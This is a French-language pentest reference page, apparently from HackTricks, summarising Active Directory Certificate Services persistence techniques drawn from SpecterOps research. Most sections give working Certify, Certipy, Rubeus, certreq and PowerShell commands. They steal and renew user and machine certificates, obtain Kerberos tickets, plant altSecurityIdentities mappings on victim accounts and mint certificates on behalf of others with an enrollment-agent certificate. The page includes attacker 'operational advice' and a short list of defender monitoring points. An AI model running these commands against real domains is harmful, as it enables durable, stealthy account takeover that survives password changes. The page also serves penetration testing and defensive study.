# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Ceci est un petit résumé des chapitres sur la persistance des comptes de la recherche incroyable de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendre le vol de crédentiels d'utilisateur actifs avec des certificats – PERSIST1

Dans un scénario où un certificat permettant l'authentification de domaine peut être demandé par un utilisateur, un attaquant a l'opportunité de demander et de voler ce certificat pour maintenir la persistance sur un réseau. Par défaut, le modèle `User` dans Active Directory permet de telles demandes, bien qu'il puisse parfois être désactivé.

En utilisant [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), vous pouvez rechercher des modèles activés qui permettent l'authentification des clients et ensuite en demander un :
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Le pouvoir d'un certificat réside dans sa capacité à s'authentifier en tant qu'utilisateur auquel il appartient, indépendamment des changements de mot de passe, tant que le certificat reste valide.

Vous pouvez convertir PEM en PFX et l'utiliser pour obtenir un TGT :
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Remarque : Combinée avec d'autres techniques (voir les sections THEFT), l'authentification basée sur des certificats permet un accès persistant sans toucher à LSASS et même depuis des contextes non élevés.

## Obtenir une persistance machine avec des certificats - PERSIST2

Si un attaquant a des privilèges élevés sur un hôte, il peut inscrire le compte machine du système compromis pour un certificat en utilisant le modèle par défaut `Machine`. S'authentifier en tant que machine permet S4U2Self pour les services locaux et peut fournir une persistance durable de l'hôte :
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Étendre la persistance par le renouvellement de certificat - PERSIST3

Abuser des périodes de validité et de renouvellement des modèles de certificat permet à un attaquant de maintenir un accès à long terme. Si vous possédez un certificat précédemment émis et sa clé privée, vous pouvez le renouveler avant son expiration pour obtenir un nouveau credential à long terme sans laisser d'artefacts de demande supplémentaires liés au principal d'origine.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Conseil opérationnel : Suivez les durées de vie des fichiers PFX détenus par l'attaquant et renouvelez-les tôt. Le renouvellement peut également entraîner l'inclusion de l'extension de mappage SID moderne dans les certificats mis à jour, les rendant utilisables sous des règles de mappage DC plus strictes (voir la section suivante).

## Plantage de Mappages de Certificats Explicites (altSecurityIdentities) – PERSIST4

Si vous pouvez écrire dans l'attribut `altSecurityIdentities` d'un compte cible, vous pouvez mapper explicitement un certificat contrôlé par l'attaquant à ce compte. Cela persiste à travers les changements de mot de passe et, lorsqu'on utilise des formats de mappage forts, reste fonctionnel sous l'application moderne du DC.

Flux de haut niveau :

1. Obtenez ou émettez un certificat d'authentification client que vous contrôlez (par exemple, inscrivez le modèle `User` en tant que vous-même).
2. Extrayez un identifiant fort du certificat (Émetteur+Numéro de série, SKI ou SHA1-Clé publique).
3. Ajoutez un mappage explicite sur `altSecurityIdentities` du principal victime en utilisant cet identifiant.
4. Authentifiez-vous avec votre certificat ; le DC le mappe à la victime via le mappage explicite.

Exemple (PowerShell) utilisant un mappage fort Émetteur+Numéro de série :
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Ensuite, authentifiez-vous avec votre PFX. Certipy obtiendra un TGT directement :
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notes
- Utilisez uniquement des types de mappage forts : X509IssuerSerialNumber, X509SKI ou X509SHA1PublicKey. Les formats faibles (Subject/Issuer, Subject-only, RFC822 email) sont obsolètes et peuvent être bloqués par la politique du DC.
- La chaîne de certificats doit aboutir à une racine de confiance pour le DC. Les CAs d'entreprise dans NTAuth sont généralement de confiance ; certains environnements font également confiance aux CAs publics.

Pour plus d'informations sur les mappages explicites faibles et les chemins d'attaque, voir :

{{#ref}}
domain-escalation.md
{{#endref}}

## Agent d'inscription comme persistance – PERSIST5

Si vous obtenez un certificat valide d'Agent de Demande de Certificat/Agent d'Inscription, vous pouvez créer de nouveaux certificats capables de se connecter au nom des utilisateurs à volonté et garder le PFX de l'agent hors ligne comme un jeton de persistance. Workflow d'abus :
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La révocation du certificat d'agent ou des autorisations de modèle est nécessaire pour évincer cette persistance.

## 2025 Application stricte du mappage de certificats : Impact sur la persistance

Microsoft KB5014754 a introduit l'application stricte du mappage de certificats sur les contrôleurs de domaine. Depuis le 11 février 2025, les DC par défaut appliquent une application complète, rejetant les mappages faibles/ambiguës. Implications pratiques :

- Les certificats d'avant 2022 qui manquent de l'extension de mappage SID peuvent échouer au mappage implicite lorsque les DC sont en application complète. Les attaquants peuvent maintenir l'accès en renouvelant les certificats via AD CS (pour obtenir l'extension SID) ou en plantant un mappage explicite fort dans `altSecurityIdentities` (PERSIST4).
- Les mappages explicites utilisant des formats forts (Émetteur+Numéro de série, SKI, SHA1-Clé publique) continuent de fonctionner. Les formats faibles (Émetteur/Sujet, Sujet uniquement, RFC822) peuvent être bloqués et doivent être évités pour la persistance.

Les administrateurs doivent surveiller et alerter sur :
- Les changements dans `altSecurityIdentities` et l'émission/renouvellements des certificats d'agent d'inscription et d'utilisateur.
- Les journaux d'émission de CA pour les demandes au nom de et les modèles de renouvellement inhabituels.

## Références

- Microsoft. KB5014754 : Changements d'authentification basée sur les certificats sur les contrôleurs de domaine Windows (chronologie de l'application et mappages forts).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Référence de commande (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
